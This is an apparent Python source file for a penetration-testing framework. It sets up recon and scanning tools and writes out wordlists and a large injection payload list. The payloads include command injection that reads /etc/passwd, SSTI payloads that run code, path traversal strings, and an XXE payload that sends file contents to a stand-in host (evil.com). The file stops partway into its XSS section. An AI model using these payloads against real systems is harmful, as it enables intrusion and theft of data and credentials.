#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
 .S_SSSs     sdSSSSSSSbs   .S_SSSs     sdSSSSSSSbs    sSSs  S.      
.SS~SSSSS    YSSSSSSSS%S  .SS~SSSSS    YSSSSSSSS%S   d%%SP  SS.     
S%S   SSSS          S%S   S%S   SSSS          S%S   d%S'    S%S     
S%S    S%S         S&S    S%S    S%S         S&S    S%S     S%S     
S%S SSSS%S        S&S     S%S SSSS%S        S&S     S&S     S&S     
S&S  SSS%S        S&S     S&S  SSS%S        S&S     S&S_Ss  S&S     
S&S    S&S       S&S      S&S    S&S       S&S      S&S~SP  S&S     
S&S    S&S      S*S       S&S    S&S      S*S       S&S     S&S     
S*S    S&S     S*S        S*S    S&S     S*S        S*b     S*b     
S*S    S*S   .s*S         S*S    S*S   .s*S         S*S.    S*S.    
S*S    S*S   sY*SSSSSSSP  S*S    S*S   sY*SSSSSSSP   SSSbs   SSSbs  
SSS    S*S  sY*SSSSSSSSP  SSS    S*S  sY*SSSSSSSSP    YSSP    YSSP  
       SP                        SP                                 
       Y                         Y                                  
                                                                      
Azaz-El v5.0.0-ENHANCED - Advanced Automated Penetration Testing Framework
Enhanced Multi-Cloud, API, Infrastructure, and Web Application Security Suite
"""

import os
import sys
import subprocess
import json
import logging
from pathlib import Path
from datetime import datetime
import shutil
import uuid
import webbrowser
import argparse
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional, Tuple, Set
import hashlib # For hashing results

# --- Configuration ---
APP = "Azaz-El"
VERSION = "v5.0.0-ENHANCED"
AUTHOR = "Advanced Security Research Team"
BANNER = r"""
 .S_SSSs     sdSSSSSSSbs   .S_SSSs     sdSSSSSSSbs    sSSs  S.      
.SS~SSSSS    YSSSSSSSS%S  .SS~SSSSS    YSSSSSSSS%S   d%%SP  SS.     
S%S   SSSS          S%S   S%S   SSSS          S%S   d%S'    S%S     
S%S    S%S         S&S    S%S    S%S         S&S    S%S     S%S     
S%S SSSS%S        S&S     S%S SSSS%S        S&S     S&S     S&S     
S&S  SSS%S        S&S     S&S  SSS%S        S&S     S&S_Ss  S&S     
S&S    S&S       S&S      S&S    S&S       S&S      S&S~SP  S&S     
S&S    S&S      S*S       S&S    S&S      S*S       S&S     S&S     
S*S    S&S     S*S        S*S    S&S     S*S        S*b     S*b     
S*S    S*S   .s*S         S*S    S*S   .s*S         S*S.    S*S.    
S*S    S*S   sY*SSSSSSSP  S*S    S*S   sY*SSSSSSSP   SSSbs   SSSbs  
SSS    S*S  sY*SSSSSSSSP  SSS    S*S  sY*SSSSSSSSP    YSSP    YSSP  
       SP                        SP                                 
       Y                         Y                                  
                                                                      
"""

# --- Directory Structure ---
HERE = Path(__file__).resolve().parent
TARGETS_FILE = HERE / "targets.txt"
RUNS_DIR = HERE / "runs"
LOG_DIR = HERE / "logs"
CFG_FILE = HERE / "moloch.cfg.json"
PLUGINS_DIR = HERE / "plugins"
PAYLOADS_DIR = HERE / "payloads"
WORDLISTS_DIR = HERE / "wordlists"
MERGED_DIR = HERE / "lists_merged"
EXPLOITS_DIR = HERE / "exploits"
BACKUP_DIR = HERE / "backups"
TOOLS_DIR = HERE / "tools" # For tools that might need local installation/config
REPORTS_DIR = HERE / "reports" # For consolidated reports

# --- Logging Setup ---
def setup_logging():
    """Initialize logging to file and console."""
    LOG_DIR.mkdir(exist_ok=True)
    log_file = LOG_DIR / f"moloch_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    # Create a custom logger
    logger = logging.getLogger("moloch_logger")
    logger.setLevel(logging.DEBUG) # Capture all levels in the logger

    # Create handlers
    c_handler = logging.StreamHandler(sys.stdout)
    f_handler = logging.FileHandler(log_file)
    c_handler.setLevel(logging.INFO) # Console shows INFO and above
    f_handler.setLevel(logging.DEBUG) # File logs everything

    # Create formatters and add them to handlers
    c_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    f_format = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s')
    c_handler.setFormatter(c_format)
    f_handler.setFormatter(f_format)

    # Add handlers to the logger
    logger.addHandler(c_handler)
    logger.addHandler(f_handler)

    return logger

logger = setup_logging()

# --- Default Configuration ---
DEFAULT_CONFIG = {
    "tools": {
        "subfinder": {"enabled": True, "flags": ["-all", "-recursive", "-d"], "install_cmd": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"},
        "amass": {"enabled": True, "flags": ["enum", "-passive", "-d"], "install_cmd": "go install -v github.com/owasp-amass/amass/v4/...@master"},
        "assetfinder": {"enabled": True, "flags": ["--subs-only"], "install_cmd": "go install github.com/tomnomnom/assetfinder@latest"},
        "findomain": {"enabled": True, "flags": ["-t"], "install_cmd": "wget https://github.com/findomain/findomain/releases/latest/download/findomain-linux -O findomain && chmod +x findomain && sudo mv findomain /usr/local/bin/"},
        "chaos": {"enabled": False, "flags": ["-d"], "install_cmd": "go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest"}, # Requires API key
        "shuffledns": {"enabled": False, "flags": [], "install_cmd": "go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"}, # Requires massdns and wordlist
        "httpx": {"enabled": True, "flags": ["-silent", "-title", "-web-server", "-tech-detect", "-status-code", "-follow-redirects", "-random-agent", "-probe"], "install_cmd": "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"},
        "nuclei": {
            "enabled": True,
            "flags": ["-silent", "-severity", "low,medium,high,critical", "-c", "100", "-rl", "300"],
            "community_templates": True,
            "custom_templates": True,
            "template_sources": ["~/nuclei-templates", "~/nuclei-community-templates"],
            "install_cmd": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        },
        "ffuf": {"enabled": True, "flags": ["-c", "-v", "-mc", "200,204,301,302,307,401,403,405,500", "-t", "50", "-recursion", "-of", "json"], "install_cmd": "go install github.com/ffuf/ffuf/v2@latest"},
        "gobuster": {"enabled": True, "flags": ["dir", "-q", "-z", "-k"], "install_cmd": "go install github.com/OJ/gobuster/v3@latest"},
        "katana": {"enabled": True, "flags": ["-silent", "-ps", "-f", "raw"], "install_cmd": "go install github.com/projectdiscovery/katana/cmd/katana@latest"}, # Crawling
        "gau": {"enabled": True, "flags": ["--subs"], "install_cmd": "go install github.com/lc/gau/v2/cmd/gau@latest"},
        "waybackurls": {"enabled": True, "flags": [], "install_cmd": "go install github.com/tomnomnom/waybackurls@latest"},
        "dalfox": {"enabled": True, "flags": ["-b", "your.xss.hunter.domain"], "install_cmd": "go install github.com/hahwul/dalfox/v2@latest"}, # XSS Scanning - Replace with your domain
        "arjun": {"enabled": True, "flags": ["-w", "default"], "install_cmd": "pip3 install arjun"}, # Parameter Discovery
        "testssl": {"enabled": True, "flags": ["--quiet", "--warnings", "off", "--jsonfile-pretty"], "install_cmd": "git clone --depth 1 https://github.com/drwetter/testssl.sh.git && cd testssl.sh && sudo ln -sf $(pwd)/testssl.sh /usr/local/bin/testssl.sh && cd .. && rm -rf testssl.sh"}, # SSL/TLS Testing (Install script)
        "nikto": {"enabled": True, "flags": ["-C all", "-Format", "json"], "install_cmd": "sudo apt install nikto -y || brew install nikto || echo 'Install nikto manually'"}, # Web Server Scanning
        "nmap": {"enabled": True, "flags": ["-sV", "-sC", "-Pn", "-T4"], "install_cmd": "sudo apt install nmap -y || brew install nmap || echo 'Install nmap manually'"}, # Port Scanning
        "dnsx": {"enabled": True, "flags": ["-silent", "-resp-only"], "install_cmd": "go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest"}, # DNS Resolution
        "naabu": {"enabled": True, "flags": ["-silent", "-top-ports", "1000"], "install_cmd": "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"}, # Port Scanning Alternative
    },
    "wordlists": {
        "subdomains": "subdomains-top1million-5000.txt", # Default relative to WORDLISTS_DIR or full path
        "fuzzing": "raft-medium-directories.txt", # Default relative to WORDLISTS_DIR or full path
        "parameters": "param-miner.txt", # Default relative to WORDLISTS_DIR or full path
        "xss": "xss-payload-list.txt", # Default relative to PAYLOADS_DIR or full path
        "sqli": "sqli-payload-list.txt", # Default relative to PAYLOADS_DIR or full path
    },
    "payloads": {
        # These can be used for custom scripts or manual checks
        # Extensive payloads are now in separate files created by create_enhanced_wordlists_and_payloads
    },
    "output": {
        "auto_open_html": True,
        "report_format": "html", # Could be extended to json, markdown
        "consolidated_findings_file": "moloch_findings.json" # New: Consolidated results file
    },
    "performance": {
        "max_workers": 10,
        "tool_timeout": 600, # 10 minutes default timeout
        "rate_limit": 1000, # General rate limit placeholder
    },
    "auth": {
        "nuclei_interactsh": "", # Interactsh server for OOB testing
        "chaos_api_key": "", # Chaos API Key
        "github_token": "", # For GitHub dorking if integrated
        "dalfox_blind_xss": "", # Blind XSS server for Dalfox
    },
    "modules": {
        "recon": True,
        "scanning": True,
        "web": True,
        "fuzzing": True,
        "reporting": True
    }
}

# --- Environment & Dependency Management ---
def _bump_path() -> None:
    """Update PATH environment variable to include common binary locations."""
    envpath = os.environ.get("PATH", "")
    home = Path.home()
    add = [
        home / ".local/bin",
        home / "go/bin",
        home / ".go/bin",
        "/usr/local/go/bin",
        "/usr/local/bin",
        "/usr/bin",
        "/bin",
        "/opt/metasploit-framework/bin",
        "/snap/bin", # For snap packages
        "/usr/games", # Sometimes tools are installed here
        TOOLS_DIR, # Add local tools directory
    ]
    # Also set GOPATH and GOBIN if not set
    if not os.environ.get("GOPATH"):
        os.environ["GOPATH"] = str(home / "go")
    if not os.environ.get("GOBIN"):
        os.environ["GOBIN"] = str(home / "go/bin")
    # Ensure Go bin directories exist
    go_bin = home / "go/bin"
    if not go_bin.exists():
        try:
            go_bin.mkdir(parents=True, exist_ok=True)
            logger.debug(f"Created Go bin directory: {go_bin}")
        except Exception as e:
            logger.warning(f"Failed to create Go bin directory: {e}")
    for p in add:
        s = str(p)
        if s not in envpath:
            try:
                # Check if path exists - handle both Path objects and strings
                if hasattr(p, "exists"):
                    exists = p.exists()
                else:
                    exists = os.path.exists(s)
                if exists:
                    os.environ["PATH"] = s + os.pathsep + envpath
                    envpath = os.environ["PATH"] # Update for next iteration
                    logger.debug(f"Added to PATH: {s}")
            except Exception as e:
                logger.warning(f"Error adding {s} to PATH: {e}")

def which(tool_name: str) -> Optional[str]:
    """Check if a tool is available in PATH and return its path."""
    _bump_path() # Ensure PATH is updated before checking
    return shutil.which(tool_name)

def run_cmd(cmd: List[str], cwd: Optional[str] = None, timeout: Optional[int] = None, env: Optional[Dict[str, str]] = None, shell: bool = False) -> subprocess.CompletedProcess:
    """Execute a command safely."""
    logger.debug(f"Executing: {' '.join(cmd)}")
    effective_env = os.environ.copy()
    if env:
        effective_env.update(env)
    try:
        result = subprocess.run(
            cmd,
            cwd=cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout,
            check=False, # Don't raise on non-zero exit
            env=effective_env,
            shell=shell # Add shell parameter
        )
        if result.returncode != 0:
            logger.warning(f"Command failed ({result.returncode}): {' '.join(cmd)}\nSTDERR: {result.stderr}")
        return result
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {' '.join(cmd)}")
        return subprocess.CompletedProcess(cmd, -1, "", "Command timed out")
    except Exception as e:
        logger.error(f"Command execution error: {e}")
        return subprocess.CompletedProcess(cmd, -1, "", str(e))

def install_tool(tool_name: str, config: Dict[str, Any]) -> bool:
    """Attempt to install a tool using its configured command."""
    tool_config = config.get("tools", {}).get(tool_name, {})
    install_cmd_str = tool_config.get("install_cmd")

    if not install_cmd_str:
        logger.warning(f"No installation command found for {tool_name}")
        return False

    logger.info(f"Attempting to install {tool_name}...")
    try:
        # Use shell=True for complex commands like chained installs or conditionals
        # Pass the command as a string when using shell=True
        result = subprocess.run(
            install_cmd_str,  # Pass as string when shell=True
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=600,
            check=False,
        )
        if result.returncode == 0:
            logger.info(f"Successfully installed {tool_name}")
            return True
        else:
            logger.error(f"Failed to install {tool_name}: {result.stderr}")
            return False
    except Exception as e:
        logger.error(f"Exception during installation of {tool_name}: {e}")
        return False

def check_and_install_dependencies(config: Dict[str, Any]) -> bool:
    """Check for required tools and attempt to install missing ones."""
    logger.info("Checking and installing dependencies...")
    all_good = True
    tools_config = config.get("tools", {})

    # Check essential system tools first
    essential_tools = ["git", "wget", "curl", "go", "python3"]
    for tool in essential_tools:
        if not which(tool):
            logger.error(f"Essential system tool '{tool}' is missing. Please install it manually (e.g., 'sudo apt install {tool}' or 'brew install {tool}').")
            all_good = False

    if not all_good:
        logger.error("Essential system dependencies are missing. Cannot proceed with tool installation.")
        return False

    # Check and potentially install security tools (with user confirmation for time-consuming installs)
    missing_tools = []
    for tool_name, tool_config in tools_config.items():
        if not which(tool_name):
            missing_tools.append(tool_name)

    if missing_tools:
        logger.warning(f"Missing tools: {', '.join(missing_tools)}")
        install_choice = input(f"Install missing tools? This may take several minutes. (yes/no): ").strip().lower()
        
        if install_choice == 'yes':
            logger.info("Installing missing tools. This may take some time...")
            for tool_name in missing_tools:
                logger.info(f"Installing {tool_name}...")
                if install_tool(tool_name, config):
                    logger.info(f"Tool '{tool_name}' installed successfully.")
                else:
                    logger.warning(f"Failed to install '{tool_name}'. It will be skipped if not essential.")
                    # Add a small delay to prevent overwhelming the system
                    time.sleep(1)
        else:
            logger.info("Skipping tool installation. Some features may not work.")
    else:
        logger.info("All configured security tools are available.")
    
    return True

def create_directories():
    """Create all necessary directories for Moloch."""
    logger.info("Creating necessary directories...")
    dirs_to_create = [
        RUNS_DIR, LOG_DIR, PLUGINS_DIR, PAYLOADS_DIR,
        WORDLISTS_DIR, MERGED_DIR, EXPLOITS_DIR, BACKUP_DIR, TOOLS_DIR, REPORTS_DIR
    ]
    for d in dirs_to_create:
        try:
            d.mkdir(parents=True, exist_ok=True)
            logger.debug(f"Ensured directory exists: {d}")
        except Exception as e:
            logger.error(f"Failed to create directory {d}: {e}")
            # Consider if this is fatal. For now, we log and continue.

def create_default_wordlists():
    """Create basic default wordlists if they don't exist."""
    logger.info("Ensuring default wordlists exist...")
    # This function now relies on external files. We just ensure the directory exists.
    WORDLISTS_DIR.mkdir(exist_ok=True)
    PAYLOADS_DIR.mkdir(exist_ok=True)
    
    # Create enhanced wordlists if they don't exist
    create_enhanced_wordlists_and_payloads()

def create_enhanced_wordlists_and_payloads():
    """Create comprehensive wordlists and payloads for all tools."""
    logger.info("Creating enhanced wordlists and payloads...")
    
    # Check if main wordlists already exist
    subdomain_wordlist = WORDLISTS_DIR / "subdomains-top1million-5000.txt"
    directory_wordlist = WORDLISTS_DIR / "raft-medium-directories.txt"
    param_wordlist = WORDLISTS_DIR / "param-miner.txt"
    xss_payloads = PAYLOADS_DIR / "xss-payload-list.txt"
    sqli_payloads = PAYLOADS_DIR / "sqli-payload-list.txt"
    
    # If any don't exist, they were already created above. Let's create additional ones.
    
    # Create comprehensive extensions wordlist
    extensions_file = WORDLISTS_DIR / "common-extensions.txt"
    if not extensions_file.exists():
        extensions = [
            "php", "asp", "aspx", "jsp", "jspx", "py", "pl", "cgi", "sh", "bat", "cmd",
            "html", "htm", "xml", "json", "txt", "log", "bak", "backup", "old", "orig",
            "config", "conf", "cfg", "ini", "properties", "yml", "yaml", "env", "git",
            "svn", "sql", "db", "sqlite", "mdb", "zip", "rar", "tar", "gz", "7z",
            "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "csv", "rtf",
            "jpg", "jpeg", "png", "gif", "bmp", "svg", "ico", "webp", "tiff",
            "mp3", "mp4", "avi", "mov", "wmv", "flv", "swf", "exe", "dll", "so",
            "class", "jar", "war", "ear", "deb", "rpm", "dmg", "pkg", "msi"
        ]
        write_lines(extensions_file, extensions)
        logger.info(f"Created extensions wordlist: {extensions_file}")
    
    # Create API endpoints wordlist
    api_endpoints_file = WORDLISTS_DIR / "api-endpoints.txt"
    if not api_endpoints_file.exists():
        api_endpoints = [
            "api", "v1", "v2", "v3", "v4", "v5", "rest", "graphql", "soap", "rpc",
            "users", "user", "accounts", "account", "login", "logout", "auth", "authenticate",
            "register", "signup", "signin", "password", "reset", "forgot", "recover",
            "profile", "settings", "preferences", "config", "configuration", "admin",
            "dashboard", "panel", "control", "management", "status", "health", "ping",
            "version", "info", "debug", "test", "demo", "docs", "documentation",
            "swagger", "openapi", "spec", "schema", "metadata", "search", "query",
            "filter", "sort", "order", "limit", "offset", "page", "size", "count",
            "create", "read", "update", "delete", "crud", "get", "post", "put", "patch",
            "head", "options", "trace", "connect", "upload", "download", "file", "files",
            "image", "images", "media", "assets", "static", "public", "private",
            "secure", "encrypt", "decrypt", "hash", "token", "key", "secret", "oauth",
            "jwt", "session", "cookie", "cache", "redis", "memcached", "database",
            "db", "sql", "nosql", "mongo", "mysql", "postgres", "oracle", "sqlite",
            "backup", "restore", "export", "import", "sync", "async", "batch", "bulk",
            "queue", "job", "task", "worker", "process", "thread", "service", "microservice",
            "webhook", "callback", "notify", "notification", "alert", "message", "mail",
            "email", "sms", "push", "socket", "websocket", "sse", "stream", "real-time",
            "live", "monitoring", "metrics", "analytics", "tracking", "logging", "audit",
            "report", "reports", "statistics", "stats", "chart", "graph", "visualization"
        ]
        write_lines(api_endpoints_file, api_endpoints)
        logger.info(f"Created API endpoints wordlist: {api_endpoints_file}")
    
    # Create sensitive files wordlist
    sensitive_files_file = WORDLISTS_DIR / "sensitive-files.txt"
    if not sensitive_files_file.exists():
        sensitive_files = [
            "web.config", "app.config", "config.php", "configuration.php", "config.inc.php",
            "config.inc", "config.default.php", "config.yml", "config.yaml", "config.json",
            "config.xml", "settings.php", "settings.yml", "settings.yaml", "settings.json",
            "wp-config.php", "wp-config.php.bak", "wp-config.php.old", "wp-config.php~",
            "wp-config.txt", "wp-config-sample.php", "configuration.php", "configuration.php~",
            "configuration.php.bak", "configuration.php.old", "joomla.conf", "database.yml",
            "database.yaml", "database.json", "database.xml", "database.php", "db.php",
            "db.inc.php", "db.inc", "connect.php", "connect.inc.php", "connect.inc",
            "connection.php", "connection.inc.php", "connection.inc", "mysql.inc.php",
            "mysql.inc", "postgresql.inc.php", "postgresql.inc", "oracle.inc.php",
            "oracle.inc", "mssql.inc.php", "mssql.inc", "sqlite.inc.php", "sqlite.inc",
            "constants.php", "constants.inc.php", "constants.inc", "global.php",
            "global.inc.php", "global.inc", "globals.php", "globals.inc.php", "globals.inc",
            "common.php", "common.inc.php", "common.inc", "functions.php", "functions.inc.php",
            "functions.inc", "lib.php", "lib.inc.php", "lib.inc", "library.php",
            "library.inc.php", "library.inc", "class.php", "class.inc.php", "class.inc",
            "include.php", "include.inc.php", "include.inc", "require.php", "require.inc.php",
            "require.inc", "header.php", "header.inc.php", "header.inc", "footer.php",
            "footer.inc.php", "footer.inc", "init.php", "init.inc.php", "init.inc",
            "bootstrap.php", "bootstrap.inc.php", "bootstrap.inc", "autoload.php",
            "autoload.inc.php", "autoload.inc", "index.php", "index.html", "index.htm",
            "default.php", "default.html", "default.htm", "main.php", "main.html", "main.htm",
            "home.php", "home.html", "home.htm", "login.php", "login.html", "login.htm",
            "admin.php", "admin.html", "admin.htm", "administrator.php", "administrator.html",
            "administrator.htm", "manager.php", "manager.html", "manager.htm", "control.php",
            "control.html", "control.htm", "panel.php", "panel.html", "panel.htm",
            "dashboard.php", "dashboard.html", "dashboard.htm", "cpanel.php", "cpanel.html",
            "cpanel.htm", "webmin.php", "webmin.html", "webmin.htm", "phpmyadmin.php",
            "phpmyadmin.html", "phpmyadmin.htm", "adminer.php", "adminer.html", "adminer.htm",
            "readme.txt", "readme.md", "README.txt", "README.md", "changelog.txt",
            "changelog.md", "CHANGELOG.txt", "CHANGELOG.md", "license.txt", "license.md",
            "LICENSE.txt", "LICENSE.md", "todo.txt", "todo.md", "TODO.txt", "TODO.md",
            "install.php", "install.html", "install.htm", "setup.php", "setup.html",
            "setup.htm", "upgrade.php", "upgrade.html", "upgrade.htm", "update.php",
            "update.html", "update.htm", "test.php", "test.html", "test.htm", "debug.php",
            "debug.html", "debug.htm", "info.php", "info.html", "info.htm", "phpinfo.php",
            "phpinfo.html", "phpinfo.htm", "server-info", "server-status", "status.php",
            "status.html", "status.htm", "health.php", "health.html", "health.htm",
            "ping.php", "ping.html", "ping.htm", "version.php", "version.html", "version.htm",
            "robots.txt", "sitemap.xml", "sitemap.txt", "humans.txt", "crossdomain.xml",
            "clientaccesspolicy.xml", "browserconfig.xml", "manifest.json", "package.json",
            "composer.json", "bower.json", "gulpfile.js", "gruntfile.js", "webpack.config.js",
            "yarn.lock", "package-lock.json", "composer.lock", "Gemfile", "Gemfile.lock",
            "requirements.txt", "pipfile", "pipfile.lock", "poetry.lock", "go.mod", "go.sum",
            "cargo.toml", "cargo.lock", "pom.xml", "build.gradle", "build.xml", "makefile",
            "dockerfile", "docker-compose.yml", "docker-compose.yaml", "vagrant.yml",
            "vagrantfile", "ansible.yml", "ansible.yaml", "terraform.tf", "terraform.tfvars",
            "kubernetes.yml", "kubernetes.yaml", "helm.yml", "helm.yaml", ".env", ".env.local",
            ".env.production", ".env.development", ".env.staging", ".env.test", ".env.example",
            ".env.sample", ".htaccess", ".htpasswd", ".htgroup", ".apache", ".nginx", ".iis",
            ".git", ".gitignore", ".gitmodules", ".gitattributes", ".svn", ".hg", ".bzr",
            ".cvs", ".DS_Store", "thumbs.db", "desktop.ini", "error_log", "access_log",
            "access.log", "error.log", "debug.log", "application.log", "system.log",
            "security.log", "audit.log", "backup.sql", "backup.db", "backup.zip", "backup.tar",
            "backup.tar.gz", "backup.tar.bz2", "backup.rar", "backup.7z", "dump.sql",
            "dump.db", "export.sql", "export.db", "import.sql", "import.db", "migration.sql",
            "migration.db", "seed.sql", "seed.db", "schema.sql", "schema.db", "structure.sql",
            "structure.db", "data.sql", "data.db", "users.sql", "users.db", "accounts.sql",
            "accounts.db", "passwords.sql", "passwords.db", "sessions.sql", "sessions.db",
            "tokens.sql", "tokens.db", "keys.sql", "keys.db", "secrets.sql", "secrets.db",
            "private.key", "public.key", "private.pem", "public.pem", "certificate.crt",
            "certificate.pem", "ca.crt", "ca.pem", "ssl.crt", "ssl.pem", "tls.crt", "tls.pem",
            "server.key", "server.crt", "server.pem", "client.key", "client.crt", "client.pem",
            "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "known_hosts", "authorized_keys",
            "ssh_config", "sshd_config", "shadow", "passwd", "group", "gshadow", "sudoers",
            "hosts", "resolv.conf", "nsswitch.conf", "hostname", "issue", "motd", "profile",
            "bashrc", "bash_profile", "bash_history", "zshrc", "zsh_history", "history",
            "vimrc", "nanorc", "tmux.conf", "screenrc", "inputrc", "wgetrc", "curlrc"
        ]
        write_lines(sensitive_files_file, sensitive_files)
        logger.info(f"Created sensitive files wordlist: {sensitive_files_file}")
    
    # Create comprehensive SQL injection payloads
    advanced_sqli_file = PAYLOADS_DIR / "advanced-sqli-payloads.txt"
    if not advanced_sqli_file.exists():
        advanced_sqli = [
            # Boolean-based blind SQLi
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='8'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>100--",
            "' AND (SELECT LENGTH(database()))>5--",
            "' AND (SELECT LENGTH(user()))>4--",
            "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>96--",
            "' AND (SELECT ASCII(SUBSTRING(user(),1,1)))>96--",
            # Time-based blind SQLi
            "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
            "'; IF((SELECT COUNT(*) FROM information_schema.tables)>100) WAITFOR DELAY '0:0:5'--",
            "' AND IF((SELECT LENGTH(database()))>5,SLEEP(5),0)--",
            "' AND IF((SELECT LENGTH(user()))>4,SLEEP(5),0)--",
            "' AND IF((SELECT ASCII(SUBSTRING(database(),1,1)))>96,SLEEP(5),0)--",
            # Error-based SQLi
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
            # UNION-based SQLi with various column counts
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' UNION SELECT @@version,database(),user(),4,5,6,7,8,9,10--",
            # NoSQL injection
            "' || '1'=='1",
            "' || 1==1//",
            "'; return true; //",
            "'; return 1==1; //",
            "' && this.password.match(/.*/)//",
            "' && this.password.match(/^a/)//",
            "' && this.password.match(/^admin/)//",
            "' || 1==1%00",
            "admin' || 'a'=='a",
            "admin' || true//",
            # LDAP injection
            "*)(&(objectClass=*)",
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*)(|(cn=*))",
            "admin)(&(password=*))",
            # XPath injection
            "' or '1'='1",
            "' or 1=1 or 'a'='a",
            "' or count(/)>0 or 'a'='a",
            "' or name()='username' or 'a'='a",
            "' or position()=1 or 'a'='a",
            # OS command injection
            "'; ls -la; echo 'done",
            "'; cat /etc/passwd; echo 'done",
            "'; whoami; echo 'done",
            "'; id; echo 'done",
            "'; uname -a; echo 'done",
            "| ls -la",
            "| cat /etc/passwd",
            "| whoami",
            "| id",
            "| uname -a",
            "$(ls -la)",
            "$(cat /etc/passwd)",
            "$(whoami)",
            "$(id)",
            "$(uname -a)",
            "`ls -la`",
            "`cat /etc/passwd`",
            "`whoami`",
            "`id`",
            "`uname -a`",
            # Template injection
            "{{7*7}}",
            "{{7*'7'}}",
            "${7*7}",
            "#{7*7}",
            "*{7*7}",
            "{{config}}",
            "{{config.items()}}",
            "{{request}}",
            "{{self}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            # Server-side template injection (SSTI)
            "{{config.items()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
            "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
            # File inclusion
            "../../../../../../etc/passwd",
            "../../../../../../etc/shadow",
            "../../../../../../etc/hosts",
            "../../../../../../windows/system32/drivers/etc/hosts",
            "../../../../../../windows/win.ini",
            "../../../../../../windows/system.ini",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=config.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///windows/win.ini",
            # XXE injection
            "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://evil.com/evil.dtd'>%remote;]><root></root>",
            "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfiltrate SYSTEM \"http://evil.com/?x=%file;\">'>%eval;%exfiltrate;]><root></root>",
            # Expression language injection
            "${1+1}",
            "#{1+1}",
            "${7*7}",
            "#{7*7}",
            "${T(java.lang.System).getProperty('user.name')}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            # Deserialization attacks
            "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
            "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdAAEcHduZA==",
            # Format string attacks
            "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x",
            "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
            "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
            "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
            # Buffer overflow patterns
            "A" * 100,
            "A" * 256,
            "A" * 512,
            "A" * 1024,
            "A" * 2048,
            "A" * 4096,
            # Encoded payloads
            "%27%20OR%20%271%27%3D%271",
            "%22%20OR%20%221%22%3D%221",
            "%60%20OR%20%601%60%3D%601",
            "%27%20UNION%20SELECT%20NULL--",
            "%22%20UNION%20SELECT%20NULL--",
            "%60%20UNION%20SELECT%20NULL--",
            # Double encoded
            "%2527%2520OR%25201%253D1--",
            "%2522%2520OR%25201%253D1--",
            "%2560%2520OR%25201%253D1--",
            # Unicode encoded
            "\\u0027\\u0020OR\\u0020\\u0031\\u003D\\u0031",
            "\\u0022\\u0020OR\\u0020\\u0031\\u003D\\u0031",
            "\\u0060\\u0020OR\\u0020\\u0031\\u003D\\u0031",
        ]
        write_lines(advanced_sqli_file, advanced_sqli)
        logger.info(f"Created advanced SQL injection payloads: {advanced_sqli_file}")
    
    # Create comprehensive XSS payloads for different contexts
    advanced_xss_file = PAYLOADS_DIR / "advanced-xss-payloads.txt"
    if not advanced_xss_file.exists():
